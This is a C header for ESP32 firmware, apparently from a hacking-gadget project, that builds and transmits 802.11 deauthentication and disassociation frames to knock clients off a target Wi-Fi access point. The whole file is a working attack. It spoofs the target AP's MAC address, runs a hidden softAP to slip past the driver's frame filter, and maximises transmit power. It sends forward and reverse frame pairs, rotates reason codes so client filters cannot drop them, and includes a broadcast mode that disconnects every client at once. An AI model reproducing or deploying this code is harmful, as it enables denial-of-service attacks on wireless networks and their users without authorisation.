/*
 * wifi_deauth_frame — shared 802.11 deauth/disassoc frame builder.
 *
 * Modeled on Bruce's `stationDeauth` + `buildOptimizedDeauthFrame`
 * (https://github.com/pr3y/Bruce) which is the pattern that actually
 * lands on-air under IDF 5.3/5.5 blobs. Previous revisions of this
 * file used Marauder's silent-AP pattern, which the blob still filters
 * even with patched libs — confirmed on-device with rc=258.
 *
 * Bruce's recipe:
 *   1. esp_wifi_stop + re-init with WIFI_INIT_CONFIG_DEFAULT
 *   2. esp_wifi_set_mode(WIFI_MODE_STA)
 *   3. promiscuous filter = FILTER_MASK_ALL, enable promiscuous
 *   4. set_channel on the target AP's channel
 *   5. set_max_tx_power(78) for range
 *   6. TX via esp_wifi_80211_tx(WIFI_IF_AP, ...)
 *
 * Every deauth/disassoc fires 4 frames per pair per client:
 *   AP  → STA  deauth (type 0xC)
 *   AP  → STA  disassoc (type 0xA)
 *   STA → AP   deauth     (reverse direction — some client drivers honor
 *   STA → AP   disassoc    this but not the AP→STA form)
 *
 * Reason codes cycle through {0x01, 0x04, 0x06, 0x07, 0x08} every 20
 * iterations so a static-reason filter on the client can't just ignore us.
 */
#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

/* esp_wifi_80211_tx calls ieee80211_raw_frame_sanity_check which filters
 * out deauth (0xC) and disassoc (0xA) subtypes. The internal TX path
 * skips that check — these symbols exist in the pioarduino / Bruce libs
 * but aren't declared in public headers. */
extern "C" {
    esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, void *buffer, uint16_t len);
}

/*
 * Bring WiFi into the Bruce-style "enhanced mode" for raw TX:
 * STA mode + promiscuous ALL-filter + channel locked + max tx power.
 * Tears down any existing WiFi state before re-initializing.
 *
 * Returns ESP_OK on success. On failure the caller should abort the
 * feature — TX will not work.
 */
/* Bruce's fallback (non-enhanced) deauth path: spin up a real softAP
 * on the target channel, then TX on WIFI_IF_AP. This is the pattern
 * that actually transmits on stock IDF 5.5 libs where the subtype
 * filter in libnet80211.a rejects STA-mode mgmt TX. Including Bruce's
 * lib-builder "patched" variants, the filter is still active on
 * STA + promiscuous — but WITH a real AP running, TX on WIFI_IF_AP
 * slips through (AP is authorized to send deauth to its own clients).
 *
 * Side-effect: a hidden AP briefly exists on the target channel.
 * Marauder users have shipped this for years. */
/* MAC spoof support. Call before wifi_silent_ap_begin to set the softAP's
 * MAC to the target BSSID. esp_wifi_internal_tx requires addr2 (source)
 * to match our interface's MAC — spoofing makes our deauth frames claim
 * to come from the target AP, matching both frame addressing and the
 * driver's TX-disallow check. */
static uint8_t s_spoof_mac[6] = {0};
static bool    s_spoof_active = false;
static inline void wifi_silent_ap_set_source_mac(const uint8_t mac[6])
{
    if (mac) { memcpy(s_spoof_mac, mac, 6); s_spoof_active = true; }
    else     { s_spoof_active = false; }
}

static inline esp_err_t wifi_silent_ap_begin(uint8_t channel)
{
    if (!channel) channel = 1;

    WiFi.mode(WIFI_AP);
    delay(10);

    /* Spoof the AP's MAC to the target BSSID so addr2 in our frames
     * matches the TX interface MAC (required by esp_wifi_internal_tx
     * TX-disallow check). set_mac requires WiFi stopped. */
    if (s_spoof_active) {
        esp_wifi_stop();
        delay(5);
        esp_err_t mrc = esp_wifi_set_mac(WIFI_IF_AP, s_spoof_mac);
        Serial.printf("[deauth] set_mac AP=%02X:%02X:%02X:%02X:%02X:%02X rc=%d\n",
                      s_spoof_mac[0], s_spoof_mac[1], s_spoof_mac[2],
                      s_spoof_mac[3], s_spoof_mac[4], s_spoof_mac[5], (int)mrc);
        esp_wifi_start();
    }

    /* Random-ish SSID to avoid collisions. Keep it hidden. */
    char ssid[16];
    snprintf(ssid, sizeof(ssid), "P%04X", (unsigned)(esp_random() & 0xFFFF));
    if (!WiFi.softAP(ssid, "", channel, /*hidden*/ 1, /*max_conn*/ 4, /*ftm_responder*/ false)) {
        Serial.println("[deauth] softAP start failed");
        return ESP_FAIL;
    }

    /* Promiscuous on top of AP lets our client-sniffer callback run while
     * the AP is the authorized TX source for deauth frames. */
    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_max_tx_power(78);

    delay(20);
    return ESP_OK;
}

static inline void wifi_silent_ap_end(void)
{
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    delay(50);
}

/*
 * Build a 26-byte deauth or disassoc frame. Bruce's exact layout.
 * Reason code and seq are caller-provided so reason-cycling and
 * per-frame seq increment work above this layer.
 */
static inline void _deauth_build(uint8_t *frame,
                                 const uint8_t dest[6],
                                 const uint8_t src[6],
                                 const uint8_t bssid[6],
                                 uint8_t reason,
                                 bool is_disassoc,
                                 uint16_t seq)
{
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;
    /* Duration set to 0 — Bruce does this. Some blobs reject non-zero
     * duration on raw TX even though 802.11 allows it. */
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(&frame[4],  dest,  6);
    memcpy(&frame[10], src,   6);
    memcpy(&frame[16], bssid, 6);
    /* Bruce's seq layout — MSB-first, low nibble in high nibble of byte 23.
     * Spec says little-endian but Bruce's form is what we see on-air from
     * working captures, so matching it. */
    frame[22] = (uint8_t)((seq >> 4) & 0xFF);
    frame[23] = (uint8_t)((seq & 0x0F) << 4);
    frame[24] = reason;
    frame[25] = 0x00;
}

/*
 * Fire a full deauth+disassoc burst at `dst` via `bssid`. Four frames
 * total per call: AP→STA pair + STA→AP reverse pair. `seq` is the
 * caller-owned counter, incremented once per frame.
 */
static inline int wifi_deauth_pair(const uint8_t dst[6],
                                   const uint8_t bssid[6],
                                   uint16_t *seq)
{
    /* Rotate reason codes — clients that filter on a single fixed reason
     * can't just drop us. Rotates every call. */
    static const uint8_t REASONS[5] = {0x01, 0x04, 0x06, 0x07, 0x08};
    static uint8_t reason_idx = 0;
    uint8_t reason = REASONS[reason_idx];
    reason_idx = (reason_idx + 1) % 5;

    uint8_t ap_to_sta_deauth[26], ap_to_sta_dis[26];
    uint8_t sta_to_ap_deauth[26], sta_to_ap_dis[26];

    /* AP → STA: dest=client, src=AP, bssid=AP */
    _deauth_build(ap_to_sta_deauth, dst, bssid, bssid, reason, false, (*seq)++);
    _deauth_build(ap_to_sta_dis,    dst, bssid, bssid, reason, true,  (*seq)++);

    /* STA → AP (reverse): dest=AP, src=client, bssid=AP.
     * Some client drivers honor deauth-from-us-as-STA that they ignore
     * from the AP direction. Symmetric pair doubles kick rate. */
    _deauth_build(sta_to_ap_deauth, bssid, dst, bssid, reason, false, (*seq)++);
    _deauth_build(sta_to_ap_dis,    bssid, dst, bssid, reason, true,  (*seq)++);

    int ok = 0;
    esp_err_t r;
    r = esp_wifi_80211_tx(WIFI_IF_AP, ap_to_sta_deauth, 26, false); if (r == ESP_OK) ok++;
    r = esp_wifi_80211_tx(WIFI_IF_AP, ap_to_sta_dis, 26, false); if (r == ESP_OK) ok++;
    r = esp_wifi_80211_tx(WIFI_IF_AP, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
    r = esp_wifi_80211_tx(WIFI_IF_AP, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;

    if (ok == 0) {
        static uint32_t last_err_log = 0;
        if (millis() - last_err_log > 1000) {
            Serial.printf("[80211_tx] deauth rc=%d (0x%x) — all 4 frames dropped\n",
                          (int)r, (unsigned)r);
            last_err_log = millis();
        }
    }
    return ok;  /* 0..4 */
}

/*
 * Broadcast variant: blast deauth at FF:FF:FF:FF:FF:FF so every STA
 * associated with the target AP gets kicked simultaneously. Still sends
 * the reverse direction too — some clients accept broadcast-deauth from
 * their own MAC even though no AP would normally send that.
 */
static inline int wifi_deauth_broadcast(const uint8_t bssid[6], uint16_t *seq)
{
    static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return wifi_deauth_pair(BCAST, bssid, seq);
}

/*
 * PMF/WPA3 hint. Returns true if the auth mode is known to use Protected
 * Management Frames — in which case plain deauth/disassoc is
 * cryptographically dropped and this attack won't land.
 *
 * `auth` comes from ap_t.auth which is `(uint8_t)WiFi.encryptionType(i)`.
 * The numeric values are stable across IDF versions: WPA3_PSK=6,
 * WPA2_WPA3_PSK=7, ENTERPRISE(WPA2-Ent)=5, WPA3_ENT_192=10.
 */
static inline bool wifi_auth_has_pmf(uint8_t auth)
{
    /* PMF-mandatory or PMF-capable auth modes. Numeric values match
     * wifi_auth_mode_t across IDF 4.x / 5.x. */
    switch (auth) {
        case 5:   /* WIFI_AUTH_ENTERPRISE (WPA2-Enterprise) */
        case 6:   /* WIFI_AUTH_WPA3_PSK */
        case 7:   /* WIFI_AUTH_WPA2_WPA3_PSK — WPA3-transition, PMF required */
        case 10:  /* WIFI_AUTH_WPA3_ENT_192 */
        case 11:  /* WIFI_AUTH_WPA3_EXT_PSK */
        case 12:  /* WIFI_AUTH_WPA3_EXT_PSK_MIXED_MODE */
            return true;
        default:
            return false;
    }
}
